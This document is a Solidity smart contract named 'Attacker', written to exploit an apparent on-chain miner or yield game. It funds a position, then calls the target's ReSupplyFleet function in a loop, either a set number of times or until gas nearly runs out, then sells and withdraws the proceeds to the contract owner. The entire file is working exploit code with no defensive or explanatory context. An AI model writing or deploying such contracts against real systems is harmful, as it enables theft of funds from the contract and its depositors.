//SPDX-License-Identifier: NONE
pragma solidity ^0.8.14;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface Miner {
    function ReSupplyFleet(bool isCompound) external;
    function sellCargo() external;
    function LaunchFleet(address ref) external payable;
}

contract Attacker {
    Miner miner;
    address Owner;

    constructor (address _miner) {
        miner = Miner(_miner);
        Owner = msg.sender;
    }

    receive() external payable {}

     modifier onlyOwner {
        require(Owner == msg.sender);
        _;
    }

    function withdrawFunds() external onlyOwner {
        require(address(this).balance > 0);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawToken(address _token) external onlyOwner {
        address _spender = address(this);
        uint _balance = IERC20(_token).balanceOf(_spender);
        require(_balance > 0);
        IERC20(_token).approve(_spender, _balance);
        IERC20(_token).transferFrom(_spender, msg.sender, _balance);
    }

    function Sell() external {
        miner.sellCargo();
    }

    function Fund() external payable {
        miner.LaunchFleet{value: msg.value}(address(0));
    }

    function Execute(bool comp) public {
        miner.ReSupplyFleet(comp);
    }

    function Attack(uint run, bool comp, bool ext) external {
        if (run == 0) {
            if (ext) { this.Execute(comp);
            } else { Execute(comp); }
        } else if (run == 1) {
            while (gasleft() > 80000) {
                if (ext) { this.Execute(comp);
                } else { Execute(comp); }
            }
        } else {
            uint i;
            while (run > i) {
                if (ext) { this.Execute(comp);
                } else { Execute(comp); }
                i += 1;
            }
        }
    }
}